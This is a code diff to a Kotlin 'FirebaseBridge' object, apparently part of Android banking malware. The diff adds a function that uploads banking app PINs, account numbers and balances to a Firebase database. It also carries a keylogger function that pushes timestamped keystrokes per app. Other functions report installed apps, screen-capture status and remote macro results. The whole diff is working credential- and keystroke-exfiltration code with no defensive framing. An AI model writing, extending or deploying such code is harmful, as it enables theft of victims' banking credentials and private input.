@@ -35,16 +35,29 @@ object FirebaseBridge {
         deviceRef.child("screenInfo/height").setValue(h)
     }
 
-    fun sendKeylog(pkg: String, text: String) {
-        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-        infoRef.child("keylogs").push().setValue("[$ts] $pkg: $text")
+    fun updateMediaStatus(active: Boolean) {
+        deviceRef.child("mediaProjectionActive").setValue(active)
     }
 
     fun pushInstalledApps(apps: List<String>) {
         infoRef.child("installed_apps").setValue(apps.joinToString("\n"))
     }
 
-    fun pushBankData(json: String) = bankRef.push().setValue(json)
+    fun logBankData(packageName: String, pin: String? = null, account: String? = null, balance: String? = null) {
+        val data = mutableMapOf<String, Any>(
+            "package" to packageName,
+            "timestamp" to ServerValue.TIMESTAMP
+        )
+        if (pin != null) data["pin"] = pin
+        if (account != null) data["account"] = account
+        if (balance != null) data["balance"] = balance
+        bankRef.push().setValue(data)
+    }
+
+    fun sendKeylog(pkg: String, text: String) {
+        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+        infoRef.child("keylogs").push().setValue("[$ts] $pkg: $text")
+    }
 
     fun reportMacro(macroId: String, success: Boolean, details: String) {
         deviceRef.child("macros/$macroId/status").setValue(if (success) "done" else "failed")
